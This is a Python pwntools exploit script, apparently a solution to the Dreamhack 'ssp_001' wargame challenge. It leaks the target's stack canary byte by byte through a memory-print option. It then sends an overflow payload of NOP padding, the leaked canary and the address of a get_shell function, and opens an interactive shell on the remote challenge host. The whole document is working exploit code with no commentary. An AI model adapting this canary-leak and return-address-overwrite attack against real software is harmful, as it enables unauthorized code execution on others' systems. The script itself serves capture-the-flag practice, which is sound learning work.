#!/usr/bin/env python2

from pwn import *
import re

e = ELF("./ssp_001")

HOST = "host1.dreamhack.games"
PORT = 20890

conn = remote(HOST, PORT)

canary_offset = 0x80
canary = ""
conn.recv()

for i in range(3, -1, -1):
    conn.sendafter("> ", "\x50")
    conn.sendlineafter(": ", str(canary_offset + i))
    print(canary_offset + i)
    canary += re.search("(:.[0-9a-fA-F]+)", conn.recv()).group()[2:]

canary = int("0x"+canary, 16)

print(hexdump(canary))
conn.sendlineafter("> ", "\x45")
conn.sendlineafter("Name Size : ", "134")

payload = asm("nop") * 0x40 
payload += p32(canary)
payload += asm("nop") * 0x08
payload += p32(e.symbols["get_shell"])

conn.send(payload)
conn.interactive()
